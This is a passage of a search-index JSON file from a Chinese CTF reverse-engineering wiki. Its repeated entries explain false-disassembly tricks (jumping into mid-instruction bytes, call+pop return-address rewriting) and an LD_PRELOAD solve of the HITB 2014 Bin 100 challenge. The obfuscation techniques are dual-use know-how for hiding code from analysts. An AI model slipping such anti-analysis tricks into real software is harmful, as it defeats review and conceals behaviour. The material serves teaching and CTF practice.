ss:nothing, ds:_text, .text:08000000 fs:nothing, gs:nothing .text:08000000 dd 1E8h .text:08000004 ; ------------------------------------------------------------- .text:08000004 add cl, ch .text:08000006 pop eax .text:08000007 nop .text:08000008 add eax, 9 .text:0800000D push eax .text:0800000E retn .text:0800000E ; ------------------------------------------------------------- .text:0800000F dd 909090E9h .text:08000013 ; ------------------------------------------------------------- .text:08000013 retn .text:08000013 _text ends .text:08000013 .text:08000013 .text:08000013 end \u6211\u4eec\u5728\u6700\u540e\u76843\u4e2a nop , \u90fd\u88ab\u5f88\u597d\u7684\u9690\u85cf\u8d77\u6765. \u4e0d\u4ec5\u5982\u6b64, \u6211\u4eec\u8ba1\u7b97 EIP \u7684\u8fc7\u7a0b\u4e5f\u88ab\u5b8c\u7f8e\u7684\u9690\u85cf\u4e86\u8d77\u6765. \u5b9e\u9645\u4e0a\u6574\u4e2a\u53cd\u6c47\u7f16\u7684\u4ee3\u7801\u5df2\u7ecf\u8ddf\u5b9e\u9645\u4ee3\u7801\u5b8c\u5168\u4e0d\u540c. \u5982\u4f55\u89e3\u51b3\u8fd9\u9879\u95ee\u9898? \u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u80fd\u591f\u4fdd\u8bc1 100% \u51c6\u786e\u53cd\u6c47\u7f16\u7684\u5de5\u5177, \u5f53\u53cd\u6c47\u7f16\u5668\u505a\u5230\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u65f6\u5019\u4e5f\u8bb8\u80fd\u505a\u5230\u5b8c\u5168\u6b63\u786e\u7684\u6c47\u7f16. \u5728\u73b0\u5b9e\u60c5\u51b5, \u8fd9\u5e76\u4e0d\u662f\u7279\u522b\u5927\u7684\u95ee\u9898. \u56e0\u4e3a\u9488\u5bf9\u4ea4\u4e92\u6027\u53cd\u6c47\u7f16\u5668. \u4f60\u662f\u53ef\u4ee5\u6307\u5b9a\u4ee3\u7801\u8d77\u59cb\u7684\u4f4d\u7f6e. \u800c\u4e14\u5f53\u8c03\u8bd5\u7684\u65f6\u5019, \u4e5f\u80fd\u5f88\u597d\u7684\u770b\u660e\u767d\u7a0b\u5e8f\u5b9e\u9645\u8df3\u8f6c\u7684\u5730\u5740. \u6240\u4ee5\u6b64\u65f6\u6211\u4eec\u9664\u5f00\u9700\u8981\u9759\u6001\u5206\u6790, \u4e5f\u9700\u8981\u52a8\u6001\u8c03\u8bd5. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"False Disassembly"},{"location":"reverse/linux/false-disasm/#_1","text":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u5229\u7528 jmp \u8df3\u8f6c\u5230\u67d0\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4\u6267\u884c, \u4e5f\u5c31\u662f\u8bf4\u771f\u5b9e\u7684\u4ee3\u7801\u662f\u4ece\u67d0\u6761\u6307\u4ee4\"\u4e4b\u4e2d\"\u5f00\u59cb\u7684, \u4f46\u5728\u53cd\u6c47\u7f16\u65f6\u7531\u4e8e\u662f\u9488\u5bf9\u6574\u6761\u6307\u4ee4\u800c\u4e0d\u80fd\u5217\u51fa\u771f\u6b63\u88ab\u8fd0\u884c\u7684\u6c47\u7f16\u6307\u4ee4\u4ee3\u7801. \u8bf4\u8d77\u6765\u597d\u50cf\u5f88\u62d7\u53e3, \u5f88\u96be\u61c2, \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\u5427, \u7ed9\u51fa\u4ee5\u4e0b\u7684\u6c47\u7f16\u4ee3\u7801. start: jmp label+1 label: DB 0x90 mov eax, 0xf001 \u8fd9\u6bb5\u4ee3\u7801 label \u6240\u5728\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u662f DB 0x90 . \u6211\u4eec\u6765\u770b\u770b objdump \u5bf9\u8fd9\u6bb5\u4ee3\u7801\u53cd\u6c47\u7f16\u7684\u7ed3\u679c: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: 90 nop 8048086: b8 01 f0 00 00 mov eax,0xf001 \u770b\u8d77\u6765\u4e5f\u6ca1\u4ec0\u4e48\u95ee\u9898, DB 0x90 \u88ab\u51c6\u786e\u5730\u53cd\u6c47\u7f16\u6210 90 nop . \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06 nop \u6307\u4ee4\u4fee\u6539\u4e3a1\u5b57\u8282\u4ee5\u4e0a\u7684\u6307\u4ee4, \u90a3\u4e48objdump\u5c31\u4e0d\u4f1a\u8ddf\u968f\u6211\u4eec\u7684jump\u5e76\u6b63\u786e\u7684\u53cd\u6c47\u7f16, \u800c\u662f\u7ebf\u6027\u5730\u4ece\u4e0a\u5f80\u4e0b\u7ee7\u7eed\u6c47\u7f16(\u7ebf\u6027\u626b\u63cf\u7b97\u6cd5). \u6bd4\u5982\u6211\u5c06 DB 0x90 \u6539\u6210\u4e86 DB 0xE9 , \u6765\u770b\u770bobjdump\u518d\u6b21\u53cd\u6c47\u7f16\u7684\u7ed3\u679c: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: e9 b8 01 f0 00 jmp 8f48242 <__bss_start+0xeff1b6> \u5bf9\u6bd4\u4e4b\u524d\u7684\u53cd\u6c47\u7f16\u7ed3\u679c, \u4f60\u5f88\u660e\u663e\u5730\u770b\u51fa\u6765\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u5427. DB 0xE9 \u5355\u7eaf\u53ea\u662f\u4e00\u4e2a\u6570\u636e, \u4e5f\u4e0d\u4f1a\u88ab\u6267\u884c, \u800c\u53cd\u6c47\u7f16\u51fa\u7684\u7ed3\u679c, \u5374\u5c06\u5176\u89c6\u4f5c\u4e00\u4e2a\u6307\u4ee4, \u4e4b\u540e\u7684\u7ed3\u679c\u4e5f\u56e0\u6b64\u800c\u6539\u53d8\u4e86. objdump \u5ffd\u7565\u4e86jmp\u7684\u76ee\u7684\u5730\u5740\u5904\u7684\u4ee3\u7801 \u5e76\u76f4\u63a5\u6c47\u7f16jmp\u540e\u7684\u6307\u4ee4, \u8fd9\u6837\u6211\u4eec\u771f\u6b63\u7684\u4ee3\u7801\u4e5f\u5c31\u88ab\u5f88\u597d\u5730\"\u9690\u85cf\"\u4e86\u8d77\u6765","title":"\u8df3\u5230\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4"},{"location":"reverse/linux/false-disasm/#_2","text":"\u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462? \u770b\u8d77\u6765\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u5c06\u8fd9\u4e2a\u65e0\u7528\u7684 0xE9 \u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u66ff\u6362\u6210 0x90 . \u4f46\u662f\u5982\u679c\u7a0b\u5e8f\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u8ba1\u7b97checksum\u503c, \u90a3\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u884c\u4e0d\u901a\u4e86. \u6240\u4ee5\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u4f7f\u7528\u5982IDA\u6216\u7c7b\u4f3c\u6709\u505a\u63a7\u5236\u6d41\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668, \u5bf9\u4e8e\u540c\u6837\u6709\u95ee\u9898\u7684\u7a0b\u5e8f. \u53cd\u6c47\u7f16\u7ed3\u679c\u53ef\u80fd\u5982\u4e0b: ---- section .text ----: 08048080 E9 01 00 00 00 jmp Label_08048086 ; (08048086) ; (near + 0x1) 08048085 DB E9 Label_08048086: 08048086 B8 01 F0 00 00 mov eax, 0xF001 ; xref ( 08048080 ) \u53cd\u6c47\u7f16\u7ed3\u679c\u770b\u4e0a\u53bb\u8fd8\u884c","title":"\u89e3\u51b3\u65b9\u6cd5"},{"location":"reverse/linux/false-disasm/#_3","text":"\u8fd9\u79cd\u65b9\u6cd5, \u751a\u81f3\u53ef\u4ee5\u5bf9\u6297\u5206\u6790\u63a7\u5236\u6d41\u7684\u53cd\u6c47\u7f16\u5668. \u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u4e2a\u793a\u4f8b\u4ee3\u7801, \u66f4\u597d\u5730\u7406\u89e3: ; ---------------------------------------------------------------------------- call earth+1 Return: ; x instructions or random bytes here x byte(s) earth: ; earth = Return + x xor eax, eax ; align disassembly, using single byte opcode 1 byte pop eax ; start of function: get return address ( Return ) 1 byte ; y instructions or random bytes here y byte(s) add eax, x+2+y+2+1+1+z ; x+y+z+6 2 bytes push eax ; 1 byte ret ; 1 byte ; z instructions or random bytes here z byte(s) ; Code: ; !! Code Continues Here !! ; ---------------------------------------------------------------------------- \u7a0b\u5e8f\u901a\u8fc7 call+pop \u6765\u83b7\u53d6\u8c03\u7528\u51fd\u6570\u5f53\u65f6\u4fdd\u5b58\u5230\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740, \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u51fd\u6570\u524d\u7684 EIP . \u7136\u540e\u5728\u51fd\u6570\u8fd4\u56de\u5904\u585e\u5165\u5783\u573e\u6570\u636e. \u4f46\u5b9e\u9645\u4e0a\u5728\u51fd\u6570\u8fd0\u884c\u65f6\u5df2\u7ecf\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u5230\u4e86Code\u5904. \u56e0\u6b64 earth \u51fd\u6570\u8fd4\u56de\u4f1a\u8df3\u8f6c\u5230 Code \u5904\u7ee7\u7eed\u8fd0\u884c\uff0c\u800c\u4e0d\u662f Return \u5904\u7ee7\u7eed\u8fd0\u884c. \u6765\u770b\u4e00\u4e2a\u7b80\u6613\u7684demo ; ---------------------------------------------------------------------------- call earth+1 earth: DB 0xE9 ; 1 <--- pushed return address, ; E9 is opcode for jmp to disalign disas- ; sembly pop eax ; 1 hidden nop ; 1 add eax, 9 ; 2 hidden push eax ; 1 hidden ret ; 1 hidden DB 0xE9 ; 1 opcode for jmp to misalign disassembly Code: ; code continues here <--- pushed return address + 9 nop nop nop ret ; ---------------------------------------------------------------------------- \u5982\u679c\u662f\u4f7f\u7528objdump\u8fdb\u884c\u53cd\u6c47\u7f16, \u5149\u662f call earth+1 \u5c31\u4f1a\u51fa\u73b0\u95ee\u9898, \u5982\u4e0b: 00000000 <earth-0x5>: 0: e8 01 00 00 00 call 6 <earth+0x1> 00000005 <earth>: 5: e9 58 90 05 09 jmp 9059062 <earth+0x905905d> a: 00 00 add %al,(%eax) c: 00 50 c3 add %dl,0xffffffc3(%eax) f: e9 90 90 90 c3 jmp c39090a4 <earth+0xc390909f> \u6765\u770b\u4e00\u4e0b ida \u7684\u60c5\u51b5 text:08000000 ; Segment permissions: Read/Execute .text:08000000 _text segment para public 'CODE' use32 .text:08000000 assume cs:_text .text:08000000 ;org 8000000h .text:08000000 assume es:nothing, ss:nothing, ds:_text, .text:08000000 fs:nothing, gs:nothing .text:08000000 dd 1E8h .text:08000004 ; ------------------------------------------------------------- .text:08000004 add cl, ch .text:08000006 pop eax .text:08000007 nop .text:08000008 add eax, 9 .text:0800000D push eax .text:0800000E retn .text:0800000E ; ------------------------------------------------------------- .text:0800000F dd 909090E9h .text:08000013 ; ------------------------------------------------------------- .text:08000013 retn .text:08000013 _text ends .text:08000013 .text:08000013 .text:08000013 end \u6211\u4eec\u5728\u6700\u540e\u76843\u4e2a nop , \u90fd\u88ab\u5f88\u597d\u7684\u9690\u85cf\u8d77\u6765. \u4e0d\u4ec5\u5982\u6b64, \u6211\u4eec\u8ba1\u7b97 EIP \u7684\u8fc7\u7a0b\u4e5f\u88ab\u5b8c\u7f8e\u7684\u9690\u85cf\u4e86\u8d77\u6765. \u5b9e\u9645\u4e0a\u6574\u4e2a\u53cd\u6c47\u7f16\u7684\u4ee3\u7801\u5df2\u7ecf\u8ddf\u5b9e\u9645\u4ee3\u7801\u5b8c\u5168\u4e0d\u540c. \u5982\u4f55\u89e3\u51b3\u8fd9\u9879\u95ee\u9898? \u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u80fd\u591f\u4fdd\u8bc1 100% \u51c6\u786e\u53cd\u6c47\u7f16\u7684\u5de5\u5177, \u5f53\u53cd\u6c47\u7f16\u5668\u505a\u5230\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u65f6\u5019\u4e5f\u8bb8\u80fd\u505a\u5230\u5b8c\u5168\u6b63\u786e\u7684\u6c47\u7f16. \u5728\u73b0\u5b9e\u60c5\u51b5, \u8fd9\u5e76\u4e0d\u662f\u7279\u522b\u5927\u7684\u95ee\u9898. \u56e0\u4e3a\u9488\u5bf9\u4ea4\u4e92\u6027\u53cd\u6c47\u7f16\u5668. \u4f60\u662f\u53ef\u4ee5\u6307\u5b9a\u4ee3\u7801\u8d77\u59cb\u7684\u4f4d\u7f6e. \u800c\u4e14\u5f53\u8c03\u8bd5\u7684\u65f6\u5019, \u4e5f\u80fd\u5f88\u597d\u7684\u770b\u660e\u767d\u7a0b\u5e8f\u5b9e\u9645\u8df3\u8f6c\u7684\u5730\u5740. \u6240\u4ee5\u6b64\u65f6\u6211\u4eec\u9664\u5f00\u9700\u8981\u9759\u6001\u5206\u6790, \u4e5f\u9700\u8981\u52a8\u6001\u8c03\u8bd5. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"\u8fd0\u884c\u65f6\u8ba1\u7b97\u8df3\u8f6c\u5730\u5740"},{"location":"reverse/linux/ld_preload/","text":"\u539f\u7406 \u00b6 \u6b63\u5e38\u60c5\u51b5\u4e0b, Linux \u52a8\u6001\u52a0\u8f7d\u5668 ld-linux (\u89c1man\u624b\u518cld-linux(8))\u4f1a\u641c\u5bfb\u5e76\u88c5\u8f7d\u7a0b\u5e8f\u6240\u9700\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6, \u800c LD_PRELOAD \u662f\u4e00\u4e2a\u53ef\u9009\u7684\u73af\u5883\u53d8\u91cf, \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5411\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84. \u52a0\u8f7d\u5668\u4f1a\u5148\u4e8eC\u8bed\u8a00\u8fd0\u884c\u5e93\u4e4b\u524d\u8f7d\u5165 LD_PRELOAD \u6307\u5b9a\u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u9884\u88c5\u8f7d( preload )\u3002 \u9884\u88c5\u8f7d\u610f\u5473\u7740\u4f1a\u5b83\u7684\u51fd\u6570\u4f1a\u6bd4\u5176\u4ed6\u5e93\u6587\u4ef6\u4e2d\u7684\u540c\u540d\u51fd\u6570\u5148\u4e8e\u8c03\u7528, \u4e5f\u5c31\u4f7f\u5f97\u5e93\u51fd\u6570\u53ef\u4ee5\u88ab\u963b\u622a\u6216\u66ff\u6362\u6389. \u591a\u4e2a\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84\u53ef\u4ee5\u7528 \u5192\u53f7 \u6216 \u7a7a\u683c \u8fdb\u884c\u533a\u5206. \u663e\u7136\u4e0d\u4f1a\u53d7\u5230 LD_PRELOAD \u5f71\u54cd\u7684\u4e5f\u5c31\u53ea\u6709\u90a3\u4e9b\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u4e86. \u5f53\u7136\u4e3a\u907f\u514d\u7528\u4e8e\u6076\u610f\u653b\u51fb, \u5728 ruid != euid \u7684\u60c5\u51b5\u4e0b\u52a0\u8f7d\u5668\u662f\u4e0d\u4f1a\u4f7f\u7528 LD_PRELOAD \u8fdb\u884c\u9884\u88c5\u8f7d\u7684. \u66f4\u591a\u9605\u8bfb: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4 \u4f8b\u9898 \u00b6 \u4e0b\u9762\u4ee52014\u5e74 Hack In The Box Amsterdam: Bin 100 \u4e3a\u4f8b. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: hitb_bin100.elf \u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7684ELF\u6587\u4ef6. \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a: \u7a0b\u5e8f\u4f3c\u4e4e\u5728\u4e00\u76f4\u6253\u5370\u7740\u4e00\u4e9b\u53e5\u5b50. \u5e76\u4e14\u6ca1\u6709\u505c\u6b62\u4e0b\u6765\u7684\u8ff9\u8c61. \u6211\u4eec\u5c31\u7528IDA\u6253\u5f00\u6765\u770b\u4e00\u4e0b. \u9996\u5148\u6309\u4e0b Shift+F12 \u67e5\u627e\u5b57\u7b26\u4e32. \u663e\u7136, \u9664\u5f00\u4e00\u76f4\u5728\u6253\u5370\u7684\u53e5\u5b50\u5916, \u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u5b57\u7b26\u4e32: .rodata:0000000000400A53 00000006 C KEY: .rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE'S YOUR FLAG: \u6211\u4eec\u6839\u636e OK YOU WIN. HERE'S YOUR FLAG: \u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u4ee3\u7801\u5904(\u6211\u5220\u53bb\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801). int __cdecl main ( int argc , const char ** argv , const char ** envp ) { qmemcpy ( v23 , & unk_400A7E , sizeof ( v23 )); v3 = v22 ; for ( i = 9LL ; i ; -- i ) { * ( _DWORD * ) v3 = 0 ; v3 += 4 ; } v20 = 0x31337 ; v21 = time ( 0LL ); do { v11 = 0LL ; do { v5 = 0LL ; v6 = time ( 0LL ); srand ( 233811181 - v21 + v6 ); // \u521d\u59cb\u5316\u968f\u673a\u6570\u79cd\u5b50 v7 = v22 [ v11 ]; v22 [ v11 ] = rand () ^ v7 ; // \u4f2a\u968f\u673a\u6570 v8 = ( & funny )[ 8 * v11 ]; while ( v5 < strlen ( v8 ) ) { v9 = v8 [ v5 ]; if ( ( _BYTE ) v9 == 105 ) { v24 [( signed int ) v5 ] = 105 ; } else { if ( ( _DWORD ) v5 && v8 [ v5 - 1 ] != 32 ) v10 = __ctype_toupper_loc (); // \u5927\u5199 else v10 = __ctype_tolower_loc (); // \u5c0f\u5199 v24 [( signed int ) v5 ] = ( * v10 )[ v9 ]; } ++ v5 ; } v24 [( signed int ) v5 ] = 0 ; ++ v11 ; __printf_chk ( 1LL , \" \u923e%80s \u923e\u7395n\" , v24 ); // \u4e71\u7801\u7684\u5176\u5b9e\u662f\u4e00\u4e2a\u97f3\u7b26 sleep ( 1u ); } while ( v11 != 36 ); -- v20 ; } while ( v20 ); v13 = v22 ; // key\u5b58\u50a8\u5728v22\u6570\u7ec4\u5185 __printf_chk ( 1LL , \"KEY: \" , v12 ); do { v14 = ( unsigned __int8 ) * v13 ++ ; __printf_chk ( 1LL , \"%02x \" , v14 ); // \u8f93\u51fakey } while ( v13 != v23 ); v15 = 0LL ; putchar ( 10 ); __printf_chk ( 1LL , \"OK YOU WIN. HERE'S YOUR FLAG: \" , v16 ); do { v17 = v23 [ v15 ] ^ v22 [ v15 ]; // \u8ddfkey\u7684\u503c\u6709\u5f02\u6216 ++ v15 ; putchar ( v17 ); // \u8f93\u51faflag } while ( v15 != 36 ); putchar ( 10 ); // \u8f93\u51fa\u6362\u884c result = 0 ; return result ; } \u6574\u4e2a\u7684\u4ee3\u7801\u6d41\u7a0b\u4e3b\u8981\u5c31\u662f\u5728\u4e0d\u65ad\u5730\u5faa\u73af\u8f93\u51fa funny \u91cc\u7684\u53e5\u5b50, \u6ee1\u8db3\u5faa\u73af\u6761\u4ef6\u540e\u8f93\u51fa key , \u5e76\u7528 key \u8fdb\u884c\u5f02\u6216\u5f97\u5230 flag \u7684\u503c. \u4f46\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0, \u6574\u4e2a\u5faa\u73af\u7684\u6b21\u6570\u76f8\u5bf9\u6765\u8bf4\u662f\u6bd4\u8f83\u5c11\u7684. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u65b9\u6cd5, \u8ba9\u5faa\u73af\u8fdb\u884c\u5f97\u66f4\u5feb\u4e00\u4e9b. \u6bd4\u5982\u8bf4\u6211\u624b\u52a8patch\u4e00\u4e0b, \u4e0d\u8ba9\u7a0b\u5e8f\u8f93\u51fa\u5b57\u7b26\u4e32(\u5b9e\u9645\u4e0a printf \u7684\u8017\u65f6\u662f\u76f8\u5f53\u591a\u7684), \u5176\u6b21\u5c31\u662f\u4f7f\u7528 LD_PRELOAD \u4f7f\u5f97\u7a0b\u5e8f\u7684 sleep() \u5931\u6548. \u53ef\u4ee5\u5f88\u660e\u663e\u5730\u8282\u7701\u65f6\u95f4. \u624b\u52a8patch\u7684\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355. \u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4ee3\u7801\u4f4d\u7f6e, \u7136\u540e\u7528\u4e00\u4e9b\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u8fdb\u884c\u4fee\u6539. \u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528 IDA \u6765\u8fdb\u884cpatch\u5de5\u4f5c. .text: 00000000004007 B7 call ___printf_chk .text: 00000000004007 BC xor eax , eax \u5c06\u5149\u6807\u70b9\u5728 call ___printf_chk \u4e0a, \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit->Patch Program->Assemble (\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6patch\u65b9\u5f0f. \u6548\u679c\u90fd\u4e00\u6837). \u7136\u540e\u5c06\u5176\u4fee\u6539\u4e3a nop(0x90) , \u5982\u4e0b\u56fe\u6240\u793a \u5c06 4007B7 \u5230 4007BD \u4e4b\u95f4\u7684\u6c47\u7f16\u4ee3\u7801\u5168\u90e8\u4fee\u6539\u4e3a nop \u5373\u53ef. \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit->Patch Program->Apply patches to input file . \u5f53\u7136\u6700\u597d\u505a\u4e00\u4e2a\u5907\u4efd(\u5373\u52fe\u9009 Create a backup ), \u7136\u540e\u70b9\u51fbOK\u5373\u53ef(\u6211\u91cd\u547d\u540d\u4e3a\u4e86 patched.elf , \u4e0b\u8f7d\u94fe\u63a5: patched.elf ). \u73b0\u5728\u8fdb\u5165 LD_PRELOAD \u90e8\u5206. \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u7f16\u5199\u4e00\u4e0bc\u4ee3\u7801, \u4e0b\u8f7d\u94fe\u63a5: time.c static int t = 0x31337 ; void sleep ( int sec ) { t += sec ; } int time () { return t ; } \u7136\u540e\u4f7f\u7528\u547d\u4ee4 gcc --shared time.c -o time.so \u751f\u6210\u52a8\u6001\u94fe\u63a5\u6587\u4ef6. \u5f53\u7136\u4e5f\u7ed9\u51fa\u4e86\u4e0b\u8f7d\u94fe\u63a5: time.so \u7136\u540e\u6253\u5f00linux\u7ec8\u7aef, \u8fd0\u884c\u547d\u4ee4: LD_PRELOAD=./time.so ./patched.elf \u8fc7\u4e00\u4f1a, \u4f60\u5c31\u80fd\u542c\u5230CPU\u75af\u72c2\u8fd0\u8f6c\u7684\u58f0\u97f3, \u7136\u540e\u5f88\u5feb\u5c31\u51fa\u6765\u4e86flag.","title":"LD_PRELOAD"},{"location":"reverse/linux/ld_preload/#_1","text":"\u6b63\u5e38\u60c5\u51b5\u4e0b, Linux \u52a8\u6001\u52a0\u8f7d\u5668 ld-linux (\u89c1man\u624b\u518cld-linux(8))\u4f1a\u641c\u5bfb\u5e76\u88c5\u8f7d\u7a0b\u5e8f\u6240\u9700\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6, \u800c LD_PRELOAD \u662f\u4e00\u4e2a\u53ef\u9009\u7684\u73af\u5883\u53d8\u91cf, \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5411\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84. \u52a0\u8f7d\u5668\u4f1a\u5148\u4e8eC\u8bed\u8a00\u8fd0\u884c\u5e93\u4e4b\u524d\u8f7d\u5165 LD_PRELOAD \u6307\u5b9a\u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u9884\u88c5\u8f7d( preload )\u3002 \u9884\u88c5\u8f7d\u610f\u5473\u7740\u4f1a\u5b83\u7684\u51fd\u6570\u4f1a\u6bd4\u5176\u4ed6\u5e93\u6587\u4ef6\u4e2d\u7684\u540c\u540d\u51fd\u6570\u5148\u4e8e\u8c03\u7528, \u4e5f\u5c31\u4f7f\u5f97\u5e93\u51fd\u6570\u53ef\u4ee5\u88ab\u963b\u622a\u6216\u66ff\u6362\u6389. \u591a\u4e2a\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84\u53ef\u4ee5\u7528 \u5192\u53f7 \u6216 \u7a7a\u683c \u8fdb\u884c\u533a\u5206. \u663e\u7136\u4e0d\u4f1a\u53d7\u5230 LD_PRELOAD \u5f71\u54cd\u7684\u4e5f\u5c31\u53ea\u6709\u90a3\u4e9b\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u4e86. \u5f53\u7136\u4e3a\u907f\u514d\u7528\u4e8e\u6076\u610f\u653b\u51fb, \u5728 ruid != euid \u7684\u60c5\u51b5\u4e0b\u52a0\u8f7d\u5668\u662f\u4e0d\u4f1a\u4f7f\u7528 LD_PRELOAD \u8fdb\u884c\u9884\u88c5\u8f7d\u7684. \u66f4\u591a\u9605\u8bfb: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4","title":"\u539f\u7406"},{"location":"reverse/linux/ld_preload/#_2","text":"\u4e0b\u9762\u4ee52014\u5e74 Hack In The Box Amsterdam: Bin 100 \u4e3a\u4f8b. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: hitb_bin100.elf \u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7684ELF\u6587\u4ef6. \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a: \u7a0b\u5e8f\u4f3c\u4e4e\u5728\u4e00\u76f4\u6253\u5370\u7740\u4e00\u4e9b\u53e5\u5b50. \u5e76\u4e14\u6ca1\u6709\u505c\u6b62\u4e0b\u6765\u7684\u8ff9\u8c61. \u6211\u4eec\u5c31\u7528IDA\u6253\u5f00\u6765\u770b\u4e00\u4e0b. \u9996\u5148\u6309\u4e0b Shift+F12 \u67e5\u627e\u5b57\u7b26\u4e32. \u663e\u7136, \u9664\u5f00\u4e00\u76f4\u5728\u6253\u5370\u7684\u53e5\u5b50\u5916, \u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u5b57\u7b26\u4e32: .rodata:0000000000400A53 00000006 C KEY: .rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE'S YOUR FLAG: \u6211\u4eec\u6839\u636e OK YOU WIN. HERE'S YOUR FLAG: \u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u4ee3\u7801\u5904(\u6211\u5220\u53bb\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801). int __cdecl main ( int argc , const char ** argv , const char ** envp ) { qmemcpy ( v23 , & unk_400A7E , sizeof ( v23 )); v3 = v22 ; for ( i = 9LL ; i ; -- i ) { * ( _DWORD * ) v3 = 0 ; v3 += 4 ; } v20 = 0x31337 ; v21 = time ( 0LL ); do { v11 = 0LL ; do { v5 = 0LL ; v6 = time ( 0LL ); srand ( 233811181 - v21 + v6 ); // \u521d\u59cb\u5316\u968f\u673a\u6570\u79cd\u5b50 v7 = v22 [ v11 ]; v22 [ v11 ] = rand () ^ v7 ; // \u4f2a\u968f\u673a\u6570 v8 = ( & funny )[ 8 * v11 ]; while ( v5 < strlen ( v8 ) ) { v9 = v8 [ v5 ]; if ( ( _BYTE ) v9 == 105 ) { v24 [( signed int ) v5 ] = 105 ; } else { if ( ( _DWORD ) v5 && v8 [ v5 - 1 ] != 32 ) v10 = __ctype_toupper_loc (); // \u5927\u5199 else v10 = __ctype_tolower_loc (); // \u5c0f\u5199 v24 [( signed int ) v5 ] = ( * v10 )[ v9 ]; } ++ v5 ; } v24 [( signed int ) v5 ] = 0 ; ++ v11 ; __printf_chk ( 1LL , \" \u923e%80s \u923e\u7395n\" , v24 ); // \u4e71\u7801\u7684\u5176\u5b9e\u662f\u4e00\u4e2a\u97f3\u7b26 sleep ( 1u ); } while ( v11 != 36 ); -- v20 ; } while ( v20 ); v13 = v22 ; // key\u5b58\u50a8\u5728v22\u6570\u7ec4\u5185 __printf_chk ( 1LL , \"KEY: \" , v12 ); do { v14 = ( unsigned __int8 ) * v13 ++ ; __printf_chk ( 1LL , \"%02x \" , v14 ); // \u8f93\u51fakey } while ( v13 != v23 ); v15 = 0LL ; putchar ( 10 ); __printf_chk ( 1LL , \"OK YOU WIN. HERE'S YOUR FLAG: \" , v16 ); do { v17 = v23 [ v15 ] ^ v22 [ v15 ]; // \u8ddfkey\u7684\u503c\u6709\u5f02\u6216 ++ v15 ; putchar ( v17 ); // \u8f93\u51faflag } while ( v15 != 36 ); putchar ( 10 ); // \u8f93\u51fa\u6362\u884c result = 0 ; return result ; } 